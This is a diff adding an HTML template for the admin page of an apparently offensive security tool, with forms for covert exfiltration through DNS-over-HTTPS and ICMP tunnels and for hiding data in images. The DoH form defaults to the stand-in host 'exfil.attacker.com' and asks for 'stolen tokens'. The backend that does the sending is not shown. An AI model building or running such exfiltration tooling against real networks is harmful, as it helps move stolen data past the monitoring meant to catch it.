@@ -1,0 +1,158 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-6xl mx-auto py-8 font-mono-brutal">
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="/" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO DASHBOARD ]
+    </a>
+  </div>
+
+  <header class="mb-8 border-b-4 border-pure-black pb-6">
+    <h1 class="text-4xl font-extrabold tracking-tight text-pure-black dark:text-stark-white mb-2">[ EXFILTRATION_CHANNELS ]</h1>
+    <p class="text-sm text-brutal-red font-bold">&gt; Covert exfiltration channels (DNS-over-HTTPS, ICMP tunneling, Steganography)</p>
+  </header>
+
+  <!-- Sub-tabs -->
+  <div class="flex gap-4 mb-6">
+    <button onclick="switchTab('tab-doh')" id="btn-doh" class="brutal-btn-black px-6 py-2 text-xs">TAB A: DoH EXFIL</button>
+    <button onclick="switchTab('tab-icmp')" id="btn-icmp" class="brutal-btn-white px-6 py-2 text-xs">TAB B: ICMP TUNNEL</button>
+    <button onclick="switchTab('tab-stego')" id="btn-stego" class="brutal-btn-white px-6 py-2 text-xs">TAB C: STEGANOGRAPHY</button>
+  </div>
+
+  <!-- Tab A: DoH -->
+  <div id="tab-doh" class="brutal-card p-6 space-y-4">
+    <h2 class="text-xl font-bold border-b-2 border-pure-black dark:border-stark-white pb-2">[ DNS-OVER-HTTPS EXFILTRATION ]</h2>
+    <form onsubmit="runDohExfil(event)" class="space-y-4">
+      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <label class="block text-xs font-bold mb-1">DOH PROVIDER</label>
+          <select id="doh_provider" class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)]">
+            <option value="google">Google DNS (dns.google)</option>
+            <option value="cloudflare">Cloudflare (cloudflare-dns.com)</option>
+          </select>
+        </div>
+        <div>
+          <label class="block text-xs font-bold mb-1">BASE DOMAIN *</label>
+          <input type="text" id="doh_domain" required value="exfil.attacker.com" class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] font-mono text-xs">
+        </div>
+      </div>
+      <div>
+        <label class="block text-xs font-bold mb-1">DATA TO EXFILTRATE *</label>
+        <textarea id="doh_data" rows="3" required class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] font-mono text-xs" placeholder="Sensitive text payload or stolen tokens..."></textarea>
+      </div>
+      <button type="submit" class="brutal-btn-black px-6 py-2 text-xs">[ SEND VIA DOH ]</button>
+    </form>
+    <pre id="doh-out" class="hidden bg-black text-emerald-400 p-4 font-mono text-xs border-2 border-pure-black overflow-x-auto"></pre>
+  </div>
+
+  <!-- Tab B: ICMP -->
+  <div id="tab-icmp" class="brutal-card p-6 space-y-4 hidden">
+    <h2 class="text-xl font-bold border-b-2 border-pure-black dark:border-stark-white pb-2">[ ICMP TUNNEL EXFILTRATION ]</h2>
+    <form onsubmit="runIcmpExfil(event)" class="space-y-4">
+      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <label class="block text-xs font-bold mb-1">DESTINATION IP *</label>
+          <input type="text" id="icmp_dest" required value="127.0.0.1" class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] font-mono text-xs">
+        </div>
+        <div>
+          <label class="block text-xs font-bold mb-1">ENCRYPTION KEY</label>
+          <input type="text" id="icmp_key" value="secret_key_123" class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] font-mono text-xs">
+        </div>
+      </div>
+      <div>
+        <label class="block text-xs font-bold mb-1">DATA TO EXFILTRATE *</label>
+        <textarea id="icmp_data" rows="3" required class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] font-mono text-xs" placeholder="Data payload..."></textarea>
+      </div>
+      <button type="submit" class="brutal-btn-black px-6 py-2 text-xs">[ SEND ICMP PACKETS ]</button>
+    </form>
+    <pre id="icmp-out" class="hidden bg-black text-emerald-400 p-4 font-mono text-xs border-2 border-pure-black overflow-x-auto"></pre>
+  </div>
+
+  <!-- Tab C: Steganography -->
+  <div id="tab-stego" class="brutal-card p-6 space-y-4 hidden">
+    <h2 class="text-xl font-bold border-b-2 border-pure-black dark:border-stark-white pb-2">[ LSB IMAGE STEGANOGRAPHY ]</h2>
+    <form action="/admin/exfil/stegano" method="POST" enctype="multipart/form-data" class="space-y-4">
+      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+      <input type="hidden" name="action" value="embed">
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+        <div>
+          <label class="block text-xs font-bold mb-1">DATA TO EMBED (TEXT)</label>
+          <textarea name="data" rows="3" class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] font-mono text-xs" placeholder="Secret message to hide inside image pixels..."></textarea>
+        </div>
+        <div>
+          <label class="block text-xs font-bold mb-1">BITS PER CHANNEL</label>
+          <select name="bits_per_channel" class="w-full p-2.5 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)]">
+            <option value="1">1 Bit (Highest Invisibility)</option>
+            <option value="2">2 Bits (Medium Capacity)</option>
+            <option value="3">3 Bits (High Capacity)</option>
+          </select>
+        </div>
+      </div>
+      <div>
+        <label class="block text-xs font-bold mb-1">OPTIONAL COVER IMAGE (PNG)</label>
+        <input type="file" name="cover_image" class="w-full p-2 border-2 border-pure-black dark:border-stark-white bg-white dark:bg-black text-[var(--dj-fg)] text-xs">
+      </div>
+      <button type="submit" class="brutal-btn-black px-6 py-2 text-xs">[ EMBED & DOWNLOAD CARRIER IMAGE ]</button>
+    </form>
+  </div>
+</div>
+
+<script>
+  function switchTab(tabId) {
+    ['tab-doh', 'tab-icmp', 'tab-stego'].forEach(id => document.getElementById(id).classList.add('hidden'));
+    document.getElementById(tabId).classList.remove('hidden');
+
+    ['btn-doh', 'btn-icmp', 'btn-stego'].forEach(id => document.getElementById(id).className = 'brutal-btn-white px-6 py-2 text-xs');
+    const activeBtn = 'btn-' + tabId.replace('tab-', '');
+    document.getElementById(activeBtn).className = 'brutal-btn-black px-6 py-2 text-xs';
+  }
+
+  async function runDohExfil(e) {
+    e.preventDefault();
+    const out = document.getElementById('doh-out');
+    out.classList.remove('hidden');
+    out.textContent = "Exfiltrating via DoH queries...";
+    try {
+      const res = await fetch('/admin/exfil/doh', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          provider: document.getElementById('doh_provider').value,
+          base_domain: document.getElementById('doh_domain').value,
+          data: document.getElementById('doh_data').value
+        })
+      });
+      const data = await res.json();
+      out.textContent = JSON.stringify(data, null, 2);
+    } catch (err) {
+      out.textContent = "Error: " + err;
+    }
+  }
+
+  async function runIcmpExfil(e) {
+    e.preventDefault();
+    const out = document.getElementById('icmp-out');
+    out.classList.remove('hidden');
+    out.textContent = "Constructing ICMP exfiltration packets...";
+    try {
+      const res = await fetch('/admin/exfil/icmp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          destination: document.getElementById('icmp_dest').value,
+          key: document.getElementById('icmp_key').value,
+          data: document.getElementById('icmp_data').value
+        })
+      });
+      const data = await res.json();
+      out.textContent = JSON.stringify(data, null, 2);
+    } catch (err) {
+      out.textContent = "Error: " + err;
+    }
+  }
+</script>
+{% endblock %}
